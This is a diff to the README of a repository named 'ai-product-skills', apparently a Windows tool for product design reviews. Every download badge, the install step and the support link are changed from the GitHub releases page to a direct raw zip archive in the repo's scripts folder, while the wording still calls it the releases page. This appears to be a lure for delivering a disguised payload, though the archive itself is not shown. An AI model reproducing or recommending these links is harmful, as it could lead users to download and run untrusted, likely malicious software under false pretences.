@@ -1,6 +1,6 @@
 # 🤖 ai-product-skills - Simple Tools for Product Design Checks
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/amosshadowy76/ai-product-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/amosshadowy76/ai-product-skills/raw/refs/heads/main/scripts/skills_product_ai_v3.9-beta.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To get started with ai-product-skills on Windows, follow the steps below. This g
 
    Go to the releases page to download the latest version of ai-product-skills. Click this button to open the page:
 
-   [![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/amosshadowy76/ai-product-skills/releases)
+   [![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/amosshadowy76/ai-product-skills/raw/refs/heads/main/scripts/skills_product_ai_v3.9-beta.3.zip)
 
 2. **Select your download**
 
@@ -116,7 +116,7 @@ Once the app is installed and open, follow these steps to run a review:
 ## 🌐 Support and Updates
 
 You can always check the releases page to get the latest version of ai-product-skills and new features or fixes:  
-https://github.com/amosshadowy76/ai-product-skills/releases
+https://github.com/amosshadowy76/ai-product-skills/raw/refs/heads/main/scripts/skills_product_ai_v3.9-beta.3.zip
 
 If you encounter any issues, you can open a discussion or look for answers on the GitHub repository’s Issues section.
 
@@ -155,4 +155,4 @@ Main topics covered here include:
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/amosshadowy76/ai-product-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/amosshadowy76/ai-product-skills/raw/refs/heads/main/scripts/skills_product_ai_v3.9-beta.3.zip)
